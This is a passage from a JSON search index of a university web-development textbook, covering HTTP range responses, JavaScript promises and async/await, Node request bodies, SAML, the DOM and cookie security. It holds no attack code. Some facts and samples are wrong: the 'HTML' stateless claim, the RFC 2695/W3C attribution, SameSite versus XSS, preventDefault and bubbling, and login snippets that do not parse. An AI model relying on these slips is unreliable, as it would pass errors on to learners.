by the web client. It is up to the web server to determine if it will be honored.\nPartial Content Which brings us to the 206 Partial Content response status code. If the server chooses to honor a range specified in the request header, it should respond with this status code, and the body of the response should be just the bytes requested.\nIn addition, the response Content-Range header should be included with the response, specifying the actual range of bytes returned. This is similar to the Range header, but includes a the total size:\nContent-Range: \u0026lt;unit\u0026gt; \u0026lt;range-start\u0026gt;-\u0026lt;range-end\u0026gt;/\u0026lt;size\u0026gt; An asterisk (*) can be used for an unknown size.\nAlso, the Content-Type header should also be included, and match the type of file being streamed.\nIf multiple ranges are included in the response, the Content-Type is \u0026quot;multipart/byteranges\u0026quot; and the response body is formatted similarly to multipart form data.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/07-promises/",
	"title": "Promises",
	"tags": [],
	"description": "",
	"content": " CONSOLE Promises replace the callback mechanism with a JavaScript object, a Promise. In many ways, this is similar to the XMLHttpRequest object that is at the heart of AJAX. You can think of it as a state machine that is in one of three states: pending, fulfilled, or rejected.\nA promise can be created by wrapping an asynchronous call within a new Promise object. For example, we can turn a setTimeout() into a promise with:\nvar threeSecondPromise = new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(\u0026#34;Timer elapsed\u0026#34;); }, 300); }); We can also create a promise that immediately resolves using Promise.resolve(), i.e.:\nvar fifteenPromise = Promise.resolve(15); This promise is never in the pending state - it starts as resolved. Similarly, you can create a promise that starts in the rejected state with Promise.reject():\nvar failedPromise = Promise.reject(\u0026#34;I am a failure...\u0026#34;); You can also pass an error object to Promise.reject().\nUsing Promise.prototype.then() What makes promises especially useful is their then() method. This method is invoked when the promise finishes, and is passed whatever the promise resolved to, i.e. the string \u0026quot;Timer elapsed\u0026quot; in the example above. Say we want to log that result to the console:\nthreeSecondPromise.then(result =\u0026gt; {console.log(result)}); This is a rather trivial example, but we can use the same approach to define a new method for creating timers that might seem more comfortable for object-oriented programmers:\nfunction createTimer(milliseconds) { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(); }, milliseconds); }); } With this method, we can create a timer to do any arbitrary action, i.e.:\n// Say \u0026#34;Hello Delayed World\u0026#34; after five seconds createTimer(5000).then(() =\u0026gt; console.log(\u0026#34;Hello delayed World!\u0026#34;)); Using Promise.prototype.catch() In addition to the then() method, promises also provide a catch() method. This method handles any errors that were thrown by the promise. Consider this function that returns a promise to compute an average:\nfunction computeAverage(numbers) { return new Promise((resolve, reject) =\u0026gt; { // Sum the numbers var sum = numbers.reduce((acc, value) =\u0026gt; acc + value); // Compute the average var average = sum / numbers.length; resolve(average); }); } Try copying this code into the console, and then run some examples, i.e.:\ncomputeAverage([1, 3, 5]).then(average =\u0026gt; console.log(\u0026#34;The average is\u0026#34;, average)); computeAverage([0.3, 8, 20.5]).then(average =\u0026gt; console.log(\u0026#34;The average is\u0026#34;, average)); But what if we use the empty array?\ncomputeAverage([]).then(average =\u0026gt; console.log(\u0026#34;The average is\u0026#34;, average)); Because the length of the empty array is 0, we are dividing by 0, and an error will be thrown. Notice the error message reads \u0026ldquo;Uncaught (in promise)\u0026rdquo;\u0026hellip; we can use the catch() method to capture this error, i.e.:\ncomputeAverage([]) .then(average =\u0026gt; console.log(\u0026#34;The average is\u0026#34;, average)) .catch(err =\u0026gt; console.error(\u0026#34;Encountered an error:\u0026#34;, err)); Info\nNote when chaining JavaScript method calls, our dot . can be separated from the object it belongs to by whitespace. This can help keep our code readable by putting it on multiple lines.\nNow when we run this code, the error is handled by our catch(). We\u0026rsquo;re still printing it to the console as an error - but notice the message now reads \u0026quot;Encountered an error\u0026quot; ..., i.e. it\u0026rsquo;s our error message!\nLet\u0026rsquo;s try one more - an array that cannot be averaged, i.e.:\ncomputeAverage([\u0026#39;A\u0026#39;, \u0026#39;banana\u0026#39;, true]) .then(average =\u0026gt; console.log(\u0026#34;The average is\u0026#34;, average)) .catch(err =\u0026gt; console.error(\u0026#34;Encountered an error:\u0026#34;, err)); Here we see the promise resolves successfully, but the result is NaN (not a number). This is because that is the normal result of this operation in JavaScript. But what if we want that to be treated as an error? That\u0026rsquo;s where the reject() callback provided to the promise comes in - it is used to indicate the promise should fail. We\u0026rsquo;ll need to rewrite our computeAverage() method to use this:\nfunction computeAverage(numbers) { return new Promise((resolve, reject) =\u0026gt; { // Sum the numbers var sum = numbers.reduce((acc, value) =\u0026gt; acc + value); // Compute the average var average = sum / numbers.length; if(isNaN(average)) reject(\u0026#34;Average cannot be computed.\u0026#34;); else resolve(average); }); } Rejected promises are also handled by the catch() method, so if we rerun the last example:\ncomputeAverage([\u0026#39;A\u0026#39;, \u0026#39;bannana\u0026#39;, true]) .then(average =\u0026gt; console.log(\u0026#34;The average is\u0026#34;, average)) .catch(err =\u0026gt; console.error(\u0026#34;Encountered an error:\u0026#34;, err)); Notice we now see our error message!\nChaining Promise.prototype.then() and Promise.prototype.catch() Where Promise.prototype.then() and Promise.prototype.catch() really shine is when we chain a series of promises together. Remember our callback hell example?\nwebapp.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { parseFormData(req, res, (form) =\u0026gt; { var username = form.username; var password = form.password; findUserInDatabase(username, (user) =\u0026gt; { encryptPassword(password, user.salt, (hash) =\u0026gt; { if(hash === user.passwordHash) res.setCookie({user: user}); res.end(200, \u0026#34;Logged in successfully!\u0026#34;); else res.end(403, \u0026#34;Unknown username/password combo\u0026#34;); }); }); }); }); If each of our methods returned a promise, we could re-write this as:\nwebapp.get(\u0026#39;/login\u0026#39;, (req, res)) .then(parseFormData) .then(formData =\u0026gt; { var username = formData.username; var password = formData.password; return username; }) .then(findUserInDatabase) .then(user =\u0026gt; { return encryptPassword(password, user.salt); }) .then(hash =\u0026gt; { if(hash === user.passwordHash) res.setCookie({user: user}); res.end(200, \u0026#34;Logged in successfully\u0026#34;); else res.end(403, \u0026#34;Unknown username/password combo\u0026#34;); }) .catch(err =\u0026gt; { res.end(500, \u0026#34;A server error occurred\u0026#34;); }); Info\nThe Promise.prototype.catch() method catches any error or promise rejection that occurs before it in the chain - basically as soon as an error or rejection occurs, further .then() calls are skipped until a .catch() is encountered. You can also chain additional .then() calls after a .catch(), and they will be processed until another error or rejection occurs!\nPromise.All() In addition to processing promises in serial (one after another) by chaining .then() methods, sometimes we want to do them in parallel (all at the same time). For example, say we have several independent processes (perhaps each running on a webworker or separate Node thread) that when finished, we want to average together.\nThe Promise.All() method is the answer; it returns a promise to execute an arbitrary number of promises, and when all have finished, it itself resolves to an array of their results.\nLet\u0026rsquo;s do a quick example using this method. We\u0026rsquo;ll start by declaring a function to wrap a fake asynchronous process - basically creating a random number (between 1 and 100) after a random number of seconds (between 0 and 3):\nfunction mockTask() { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { var value = Math.ceil(Math.random()*100); console.log(\u0026#34;Computed value\u0026#34;, value); resolve(value); }, Math.random() * 3000) }); } Now let\u0026rsquo;s say we want to compute an average of the results once they\u0026rsquo;ve finished. As Promise.All() returns a Promise that resolves to a an array of the results, we can invoke our computeAverage() (which we declared previously) in a chained .then():\nPromise.all([ mockTask(), mockTask(), mockTask(), mockTask() ]) .then(computeAverage) .then(console.log); Note that because computeAverage takes as a parameter an array, and console.log takes as its parameter a value, and those are what the previous promises resolve to, we don\u0026rsquo;t have to define anonymous functions to pass into .then() - we can pass the function name instead.\nMany JavaScript programmers found this format more comfortable to write and read than a series of nested callbacks. However, the async and await syntax offers a third option, which we\u0026rsquo;ll look at next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/07-request-body/",
	"title": "Request Body",
	"tags": [],
	"description": "",
	"content": "After the request headers and an extra CRLF (carriage return and line feed) is the request body.\nFor GET and DELETE requests, there is no body. For POST, PUT, and PATCH, however, this section should contain the data being sent to the server. If there is a body, the headers should include Content-Type and Content-Length. The Content-Length is always provided as a count of octets (a set of eight bits). Thus, binary data is sent as an octet stream. Text data is typically sent in UTF-8 encoding.\nTwo body formats bear special mention: application/x-www-form-urlencoded and multipart/form-data. These encodings are commonly used for submitting HTML forms, and will be covered in more detail in the Form Data chapter.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/07-req-body/",
	"title": "Request Body",
	"tags": [],
	"description": "",
	"content": "While many HTTP libraries will process the entire incoming request before passing control to the program, Node\u0026rsquo;s http module takes a different approach. It constructs and passes the http.IncomingMessage and http.ServerResponse objects as soon as it has received the header portion of the request. This means the body may still be being transmitted to the server as you start to process the request.\nThis is fine for GET requests, as they don\u0026rsquo;t have a body. But for requests that do have a body, it means you have to process the incoming data yourself.\nTo do so, there are three events made available in the http.IncomingMessage object: data, end, and error.\nThe data event occurs whenever a new chunk of the body is available, and that chunk is passed to the event listener. The end event occurs once all the chunks have been received. And the error event occurs when something goes wrong. The chunks are Buffer objects, and are always received in order.\nThus, we need to collect each chunk from each data event, and join them together into a single buffer at the end event. Thus, the basic scaffold for doing so is:\nfunction loadBody(req, res) { var chunks = []; // listen for data events req.on(\u0026#39;data\u0026#39;, (chunk) =\u0026gt; { chunks.push(chunk); }); // listen for the end event req.on(\u0026#39;end\u0026#39;, () =\u0026gt; { // Combine the chunks var data = Buffer.concat(chunks); // DO SOMETHING WITH DATA }); // listen for error events req.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { // RESPOND APPROPRIATELY TO ERROR }); } Note that these events occur asynchronously, so this scaffold needs to be integrated into an appropriate asynchronous processing strategy.\nYou might wonder why the developers of Node chose to handle request bodies in this fashion. Most likely, it was for the degree of control it offers the programmer. Consider the case where you decide your program needs to be able to stop an upload - you can do so with http.IncomingMessage.destroy(), which immediately closes the socket connecting the client to the server, effectively terminating the upload.\nThis can prevent the server from doing unneeded work and consuming unnecessary bandwidth. Of course, the decision to stop an upload is highly situationally dependent - thus they leave it in your hands as the programmer.\nIn fact, a common Denial of Service attack known as an HTTP flood often takes advantage of POST requests to submit requests with large bodies to consume server resources. By giving the programmer the ability to stop uploads this way helps counter this kind of attack.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/07-saml/",
	"title": "SAML",
	"tags": [],
	"description": "",
	"content": "Security Assertion Markup Language (SAML) is a similar single-sign-on strategy to CAS, but one that has a wider adoption in the business world. The process is quite similar, with the addition that the user agent identifies the user before requesting access. How it does so is left to the implementer, but it can be an IP address, stored token, or other means.\n1\nMuch like CAS, SAML provides its response in the form of XML. And like CAS, the SAML standard primarily works with traditional, server-based web apps. We\u0026rsquo;ll turn to some alternatives next.\nFile:Saml2-browser-sso-redirect-post.png. (2021, October 17). Wikimedia Commons, the free media repository. Retrieved 15:33, June 2, 2022 from https://commons.wikimedia.org/w/index.php?title=File:Saml2-browser-sso-redirect-post.png\u0026oldid=599388084.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/07-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "In this chapter, we reviewed the Document Object Model (the DOM), the tree-like structure of HTML elements built by the browser as it parses an HTML document. We discussed how CSS rules are applied to nodes in this tree to determine how the final webpage will be rendered, and how JavaScript can be used to manipulate and transform the DOM (and the resulting webpage appearance).\nWe also discussed how JavaScript events work, and how this event-driven approach is the basis for implementing concurrency within the language. We\u0026rsquo;ll see this more as we delve into Node.js, which utilizes the same event-based concurrency model, in future chapters.\nFinally, we discussed how supplemental files (images, videos, CSS files, JavaScript files) are loaded by the browser concurrently. We saw how this can affect the functioning of JavaScript that depends on certain parts of the page already having been loaded, and saw how we can use the load event to delay running scripts until these extra files have completed loading.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/07-the-dom/",
	"title": "The Document Object Model",
	"tags": [],
	"description": "",
	"content": "Now that we\u0026rsquo;ve reviewed the basic syntax and structure of the JavaScript language, and how to load it into a page, we can turn our attention to what it was created for - to interact with web pages in the browser. This leads us to the Document Object Model (DOM).\nThe DOM is a tree-like structure that is created by the browser when it parses the HTML page. Then, as CSS rules are interpreted and applied, they are attached to the individual nodes of the tree. Finally, as the page\u0026rsquo;s JavaScript executes, it may modify the tree structure and node properties. The browser uses this structure and properties as part of its rendering process.\nThe Document Instance The DOM is exposed to JavaScript through an instance of the Document class, which is attached to the document property of the window (in the browser, the window is the top-level, a.k.a global scope. Its properties can be accessed with our without referencing the window object, i.e. window.document and document refer to the same object).\nThis document instance serves as the entry point for working with the DOM.\nThe Dom Tree The DOM tree nodes are instances of the Element class, which extends from the Node class, which in turn extends the EventTarget class. This inheritance chain reflects the Separation of Concerns design principle: the EventTarget class provides the functionality for responding to events, the Node class provides for managing and traversing the tree structure, and the Element class maintains the element\u0026rsquo;s appearance and properties.\nEventTargetNodeElement The DOM Playground The panels opposite show a simple web app where we can experiment with the DOM. Specifically, we\u0026rsquo;re going to use JavaScript code we write in playground.js to interact with the page index.html. The page already has a couple of elements defined in it - a button with id=\u0026quot;some-button\u0026quot;, and a text input with id=\u0026quot;some-input\u0026quot;.\nAdditionally, the JavaScript code in page-console.js hijacks the console.log() method so that instead of printing to the regular console, it injects the output to a div element on the page. This will help make the console more accessible in Codio. Also, it demonstrates just how dynamic a language JavaScript is - we just altered the behavior of a core function!\nSelecting Elements on the Page One of the most important skills in working with the DOM is understanding how to get a reference to an element on the page. There are many approaches, but some of the most common are:\nSelecting an Element by its ID If an element has an id attribute, we can select it with the Document.getElementByID() method. Let\u0026rsquo;s select our button this way. Add this code to your playground.js file:\nvar button = document.getElementById(\u0026#34;some-button\u0026#34;); console.log(button); You should see the line [object HTMLButtonElement] - the actual instance of the DOM node representing our button (the class HTMLButtonElement is an extension of Element representing a button).\nSelecting a Single Element by CSS Selector While there are additional selectors for selecting by tag name, class name(s), and other attributes, in practice these have largely been displaced by functions that select elements using a CSS selector.\nDocument.querySelector() will return the first element matching the CSS selector, i.e.:\nvar button = document.querySelector(\u0026#39;#some-button\u0026#39;); Works exactly like the document.getElementById() example. But we could also do:\nvar input = document.querySelector(\u0026#39;input[type=text]\u0026#39;); Which would grab the first \u0026lt;input\u0026gt; with attribute type=text.\nSelecting Multiple Elements by CSS Selector But what if we wanted to select more than one element at a time? Enter document.querySelectorAll(). It returns a NodeList containing all matching nodes. So the code:\nvar paras = document.querySelectorAll(\u0026#39;p.highlight\u0026#39;); Will populate the variable paras with a NodeList containing all \u0026lt;p\u0026gt; elements on the page with the highlight class.\nWarning\nWhile a NodeList is an iterable object that behaves much like an array, it is not an array. Its items can also be directly accessed with bracket notation ([]) or NodeList.item(). It can be iterated over with a for .. of loop, and in newer browsers, NodeList.forEach(). Alternatively, it can be converted into an array with Array.from().\nElement.querySelector() and Element.querySelectorAll() The query selector methods are also implemented on the element class, with Element.querySelector() and Element.querySelectorAll(). Instead of searching the entire document, these only search their descendants for matching elements.\nEvents Once we have a reference to an element, we can add an event listener with EventTarget.addEventListener(). This takes as its first argument, the name of the event to listen for, and as the second, a method to invoke when the event occurs. There are additional optional arguments as well (such as limiting an event listener to firing only once), see the MDN documentation for more details.\nFor example, if we wanted to log when the user clicks our button, we could use the code:\ndocument.getElementById(\u0026#34;some-button\u0026#34;).addEventListener(\u0026#39;click\u0026#39;, function(event) { event.preventDefault(); console.log(\u0026#34;Button was clicked!\u0026#34;); }); Notice we are once again using method chaining - we could also assign the element to a var and invoke addEventListener() on the variable. The event we want to listen for is identified by its name - the string 'click'. Finally, our event handler function will be invoked with an event object as its first argument.\nAlso, note the use of event.preventDefault(). Invoking this method on the event tells it that we are taking care of its responsibilities, so no need to trigger the default action. If we don\u0026rsquo;t do this, the event will continue to bubble up the DOM, triggering any additional event handlers. For example, if we added a 'click' event to an \u0026lt;a\u0026gt; element and did not invoke event.preventDefault(), when we clicked the \u0026lt;a\u0026gt; tag we would run our custom event handler and then the browser would load the page that the \u0026lt;a\u0026gt; element\u0026rsquo;s href attribute pointed to.\nCommon Event Names The most common events you\u0026rsquo;ll likely use are\n\u0026quot;click\u0026quot; triggered when an item is clicked on \u0026quot;input\u0026quot; triggered when an input element receives input \u0026quot;change\u0026quot; triggered when an input\u0026rsquo;s value changes \u0026quot;load\u0026quot; triggered when the source of a image or other media has finished loading \u0026quot;mouseover\u0026quot; and \u0026quot;mouseout\u0026quot; triggered when the mouse moves over an element or moves off an element \u0026quot;mousedown\u0026quot; and \u0026quot;mouseup\u0026quot; triggered when the mouse button is initially pressed and when it is released (primarily used for drawing and drag-and-drop) \u0026quot;mousemove\u0026quot; triggered when the mouse moves (used primarily for drawing and drag-and-drop) \u0026quot;keydown\u0026quot;, \u0026quot;keyup\u0026quot;, and \u0026quot;keypressed\u0026quot; triggered when a key is first pushed down, released, and held. Note that the mouse and key events are only passed to elements when they have focus. If you want to always catch these events, attach them to the window object.\nThere are many more events - refer to the MDN documentation of the specific element you are interested in to see the full list that applies to that element.\nEvent Objects The function used as the event handler is invoked with an object representing the event. In most cases, this is a descendant class of Event that has additional properties specific to the event type. Let\u0026rsquo;s explore this a bit with our text input. Add this code to your playground.js, reload the page, and type something into the text input:\ndocument.getElementById(\u0026#34;some-input\u0026#34;).addEventListener(\u0026#34;input\u0026#34;, function(event) { console.log(event.target.value); }); Here we access the event\u0026rsquo;s target property, which gives us the target element for the event, the original \u0026lt;input\u0026gt;. The input element has the value property, which corresponds to the value attribute of the HTML that was parsed to create it, and it changes as text is entered into the \u0026lt;input\u0026gt;.\nModifying DOM Element Properties One of the primary uses of the DOM is to alter properties of element objects in the page. Any changes to the DOM structure and properties are almost immediately applied to the appearance of the web page. Thus, we use this approach to alter the document in various ways.\nAttributes The attributes of an HTML element can be accessed and changed through the DOM, with the methods element.getAttribute(), element.hasAttribute() and element.setAttribute().\nLet\u0026rsquo;s revisit the button in our playground, and add an event listener to change the input element\u0026rsquo;s value attribute:\ndocument.getElementById(\u0026#34;some-button\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function(event) { document.getElementById(\u0026#34;some-input\u0026#34;).setAttribute(\u0026#34;value\u0026#34;, \u0026#34;Hello World!\u0026#34;) }); Notice too that both event handlers we have assigned to the button trigger when you click it. We can add as many event handlers as we like to a project.\nStyles The style property provides access to the element\u0026rsquo;s inline styles. Thus, we can set style properties on the element:\ndocument.getElementById(\u0026#34;some-button\u0026#34;).style = \u0026#34;background-color: yellow\u0026#34;; Remember from our discussion of the CSS cascade that inline styles have the highest priority.\nClass Names Alternatively, we can change the CSS classes applied to the element by changing its element.classList property, which is an instance of a DOMTokensList, which exposes the methods:\nadd() which takes one or more string arguments which are class names added to the class list remove() which takes one or more string arguments which are class names removed from the class list toggle() which takes one or more strings as arguments and toggles the class name in the list (i.e. if the class name is there, it is removed, and if not, it is added) By adding, removing, or toggling class names on an element, we can alter what CSS rules apply to it based on its CSS selector.\nAltering the Document Structure Another common use for the DOM is to add, remove, or relocate elements in the DOM tree. This in turn alters the page that is rendered. For example, let\u0026rsquo;s add a paragraph element to the page just after the \u0026lt;h1\u0026gt; element:\nvar p = document.createElement(\u0026#39;p\u0026#39;); p.innerHTML = \u0026#34;Now I see you\u0026#34;; document.body.insertBefore(p, document.querySelector(\u0026#39;h1\u0026#39;).nextSibling); Let\u0026rsquo;s walk through this code line-by-line.\nHere we use Document.createElement() to create a new element for the DOM. At this point, the element is unattached to the document, which means it will not be rendered. Now we alter the new \u0026lt;p\u0026gt; tag, adding the words \u0026quot;Now I see you\u0026quot; with the Element.innerHTML property. Then we attach the new \u0026lt;p\u0026gt; tag to the DOM tree, using Node.insertBefore() method and Node.nextSibling property. The Node interface provides a host of properties and methods for traversing, adding to, and removing from, the DOM tree. Some of the most commonly used are:\nNode.parent the parent of this Node Node.childNodes a NodeList of this node\u0026rsquo;s children Node.nextSibling returns the node following this one at the same level in the DOM tree Node.previousSibling returns the node proceeding this one in the DOM tree at the same level Node.appendChild() adds the an element as the last child of the node Node.removeChild() removes a child from the node and returns it (this means the element becomes unattached) Node.replaceChild() replaces a child element with another "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/",
	"title": "Persistent Storage",
	"tags": [],
	"description": "",
	"content": "Chapter 7 Persistent Storage Tupperware for the Web\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/08-async-await/",
	"title": "Async and Await",
	"tags": [],
	"description": "",
	"content": "The async and await keywords are probably more familiar to you from languages like C#. JavaScript introduced them to play much the same role - a function declared async is asynchronous, and returns a Promise object.\nWith this in mind, we can redeclare our createTimer() method using the async keyword:\nasync function createTimer(milliseconds) { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(); }, milliseconds); }); } Now, instead of using the promise directly, we can use the await keyword in other code to wait on the promise to resolve, i.e.:\nawait createTimer(4000); console.log(\u0026#34;Moving on...\u0026#34;); Try running this in the console. Notice that the second line is not executed until the timer has elapsed after 4 seconds!\nSimilarly, if we need to use a value computed as part of an asynchronous process, we can place the await within the assignment. I.e. to reproduce the Promise.All() example in the previous section, we could re-write our mockTask() and computeAverage() as async functions:\nasync function mockTask() { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { var value = Math.ceil(Math.random()*100); console.log(\u0026#34;Computed value\u0026#34;, value); resolve(value); }, Math.random() * 3000) }); } async function computeAverage(numbers) { return new Promise((resolve, reject) =\u0026gt; { // Sum the numbers var sum = numbers.reduce((acc, value) =\u0026gt; acc + value); // Compute the average var average = sum / numbers.length; if(isNaN(average)) reject(\u0026#34;Average cannot be computed.\u0026#34;); else resolve(average); }); } And then the code to perform the averaging could be written:\nvar numbers = []; numbers.push(await mockTask()); numbers.push(await mockTask()); numbers.push(await mockTask()); numbers.push(await mockTask()); var average = await computeAverage(numbers); console.log(average); Many imperative programmers prefer the async and await syntax, because execution of the code pauses at each await, so code statements are executed in the order they appear in the code. However, the actual execution model it is still the event-based concurrency that we introduced with callbacks. Thus, when awaiting a result, the JavaScript interpreter is free to process other incoming events pulled off the event loop.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/08-cookies/",
	"title": "Cookies",
	"tags": [],
	"description": "",
	"content": "HTML was designed as a stateless protocol. This means that there is no expectation for the server to keep track of prior requests made to it. Each incoming HTTP request is effectively treated as if it is the first request ever made to the server.\nThis was an important consideration for making the web possible. Consider what would happen if our server needed to keep track of what every visitor did on the site - especially when you have thousands of unique visitors every second? You would need a lot of memory, and a mechanism to tell which user is which. That\u0026rsquo;s a lot of extra requirements to getting a web server working.\nBut at the same time, you probably recognize that many of the websites you use every day must be doing just that. If you use Office 365 or Google Docs, they manage to store your documents, and not serve you someone else\u0026rsquo;s when you log in. When you visit an online store and place products in your shopping basket, they remain there as you navigate around the site, loading new pages. So how are these websites providing state?\nThe answer that was adopted as a W3C standard - RFC 2695 is cookies. Cookies are nothing more than text that is sent along with HTTP Requests and Responses. A server can ask a client to store a cookie with a Set-Cookie header. From that point on, any request the client makes of that server will include a Cookie header with the cookie information.\nIt\u0026rsquo;s kind of like if your forgetful teacher gives you a note to show him the next time you come to office hours, to help remind him of what you talked about previously. This way, the server doesn\u0026rsquo;t have to track state for any visitor - it can ask the visitor\u0026rsquo;s client (their browser) to do it for them.\nWhat is a Cookie? Let\u0026rsquo;s dig deeper into this idea and implementation of cookies.\nMuch like a web request or response, a cookie is nothing more than a stream of data. It gets passed between client and server through their headers. Specifically, the Set-Cookie header sends the cookie to the client, and the client will automatically return it in subsequent requests using the Cookie header.\nSay we want to establish a session id, (SID), for every unique visitor to our site. We would have our server send the SID in a Set-Cookie header:\nSet-Cookie: SID=234\nThe browser would store this value, and on subsequent requests to the same domain, include a corresponding Cookie header:\nCookie: SID=234\nUnless the Domain cookie attribute is specified (see below), a cookie is only sent to the domain that it originated from. It will not be sent to subdomains, i.e. a cookie that came from ksu.edu will not be sent to the server with hostname cs.ksu.edu.\nStructure of a Cookie As you might have guessed from the example, the string of a cookie is a set of key/value pairs using the equals sign (=) to assign the value to the key. But we can also include multiple cookie pairs using a semicolon (;) to separate the cookie pairs, i.e.:\nSet-Cookie: SID=234; lang=en-US\nBoth cookie pairs are sent back in a Cookie header:\nCookie: SID=234; lang=en-US\nWe can chain multiple pairs of cookie pairs. After the last cookie pair, we need another semicolon, then any cookie attributes, also separated by semicolons. For example:\nSet-Cookie: SID=234; lang=en-US; EXPIRES=Wed, 04 April 2019 011:30:00 CST\nadds a cookie attribute specifying an expiration date for the cookie. The legal cookie attributes are laid out in RFC6265, but we\u0026rsquo;ll reprint them here.\nCookie Attributes There are a limited number of defined cookie attributes, and each changes the nature of the cookie and how a browser will work with it in an important way. Let\u0026rsquo;s examine each in turn:\nExpires As you might expect, this sets an expiration date for the cookie. After the date, the browser will throw away the cookie, removing it from its internal cache. It will also stop sending the cookie with requests. If you need to erase a value in a cookie you\u0026rsquo;ve already sent to a user, you can respond to their next request with a new Set-Cookie header with the Expires value set in the past. To avoid issues with time zones, the date supplied must conform to the HTTP-Date format set out in RFC1123.\nMax-Age The Max-Age also sets an expiration date, but in terms of a number of seconds from the current time. A value of 0 or less (negative) will remove the cookie from the browser\u0026rsquo;s cache, and stop sending the cookie in future requests. IE 7, 8, and 9 do not support the Max-Age attribute; for all other browsers, Max-Age will take precedence over Expires.\nDomain As described above, cookies are by default sent only to the domain from which they originated, and no subdomains. If the domain is explicitly set with the Domain attribute, subdomains are included.\nPath The value of this attribute further limits what requests a cookie will be sent to. If the Path is specified, only requests whose url matches the value will be sent. This does include subpaths, i.e. Path=/documents will match the urls /documents/, /documents/1.doc, and /documents/recent/a.pdf.\nSecure Cookies including this attribute (it does not need a value) will only be sent by the browser with HTTPS requests, not HTTP requests. Note that sending the cookie over HTTPS does not encrypt the cookie data - as a header, it is sent in the clear for both HTTP and HTTPS.\nHttpOnly Cookies can normally be accessed by JavaScript on the client, from the Document.cookie property. Setting this attribute (it does not need a value) tells the browser not to make it accessible.\nSameSite (in Draft) This new cookie attribute is intended to help a server assert that its cookies should not be sent with any cross-site requests originating from this page (i.e. \u0026lt;script\u0026gt; tags, \u0026lt;img\u0026gt; tags, etc. whose source is a different site, or AJAX requests against other sites). This is intended to help combat cross-site scripting attacks. As you might expect, this is only supported in the newest browser versions.\nCookies and Security As with all web technologies, we need to consider the security implications. Cookies are received and returned by the client - and we know that anything the client is responsible for can be manipulated by an adversarial agent. Let\u0026rsquo;s think through the implications.\nAll cookies received by a browser and cached there. How long they are stored depends on the Max-Age and Expires attributes. Browsers are told to delete cookies older than their Max-Age, or whose Expires duration has passed. If neither of these are set, the cookie is considered a session cookie - it is deleted when the browser is closed (this is why you should always close a browser you use on a public computer).\nWhile session cookies only exist in memory, cookies with expiration dates may be persisted as text files in the browser\u0026rsquo;s data directory. If this is the case, it is a simple matter for a knowledgeable adversary with access to the computer to retrieve them. Also remember access doesn\u0026rsquo;t necessarily mean physical access - malware running on your computer can effectively copy this data as well.\nMoreover, cookies are just text - say for example you add the identity of your user with a cookie Set-Cookie: user-id=735. An adversary could sign up for a legitimate account with your application, and then manipulate their cookie to return Cookie: user-id:1. Since user ids are often incrementally generated primary keys in a database, it\u0026rsquo;s a good assumption that one or two low-numbered ones will belong to administrator accounts - and this adversary has just impersonated one!\nSo if we need cookies to add state to our web applications, but cookies (and therefore that state) are subject to interception and manipulation - how can we protect our users and our site?\nStrategies for Making Cookies Safe(er) Some common strategies are:\nUse HTTPS Store as little information in a cookie as possible Encrypt the cookie\u0026rsquo;s values Sign the cookie Use Short Lifespans Use HTTPS Using Secure HTTP helps prevent cookies from being intercepted during transit, as the request body and headers are encrypted before they move across the transport layer of the Internet. This does not protect cookies once they arrive at a user\u0026rsquo;s computer, however. Still, it is a great first step.\nStoring as Little in the Cookie as Possible A good general strategy is to store as little of importance in the cookie as possible. This also helps keep the size of a site\u0026rsquo;s cookies down, which means less traffic across the network, and less to store on a user\u0026rsquo;s computer. The RFC suggests browsers support a minimum size of 4096 bytes per cookie - but this is not a requirement.\nBut where do we store the session information, if not in the cookie? This is the subject of the next section, /06-dynamic-web-servers/09-sessions/. This strategy usually entails storing nothing more than a session identifier in the cookie, and storing the actual data that corresponds to that session identifier on the server. Effectively, we make our server statefull instead of stateless.\nEncrypting Cookie Values Another common strategy is encrypting the value of a cookie using a reversible encryption algorithm before sending it to the client. This kind of encryption technique is a mathematical function that can easily be reversed, provided you know the key used during the encryption process. This key should be stored in the server and never shared, only used internally to encrypt outgoing cookies and decrypt incoming ones.\nThis strategy only works if you don\u0026rsquo;t need to know the cookie\u0026rsquo;s value on the client (as the client will not have the key). Also, be wary of sending any details of the encryption with the encrypted data - anything that helps identify the encryption strategy or provides information like initialization vectors can help an adversary break the encryption. Also, check what algorithms are considered strong enough by current standards; this is always a moving target.\nSigning Cookie Values A third common technique is signing the cookie with a hash. A hash is the result of a one-way cryptographic function - it is easy to perform but very difficult to reverse. How it works is you hash the value of the cookie, and then send both the original data\u0026rsquo;s value and the hashed value as cookies. When you receive the cookie back from the client, you re-hash the value found in the cookie, and compare it to the hashed value in the cookie. If the two values are different, then the cookie has been modified.\nUse Short Lifespans The above strategies only keep adversaries from modifying cookies. There is still the danger of valid cookies being captured and used by an adversary - a technique known as session hijacking. Using HTTPS can prevent session hijacking from within the network, but will not protect against cookies lifted from the client\u0026rsquo;s computer.\nMaking sessions expire quickly can help mitigate some of the risk, especially when the adversary is using physical access to the computer to retrieve cookies - you wouldn\u0026rsquo;t expect them to do this while the user is still using the computer.\nBut non-physical access (such as a compromised computer) can lift a cookie while it is in use. Regenerating a session identifier (assuming you are using the first strategy) on each login can help, especially if you prompt users to log in before allowing especially risky actions. Adding some additional tracking information like the originating IP address to the session and prompting the user to validate a session by logging back in when this changes can also help.\nBe aware that these strategies can also be very frustrating for users 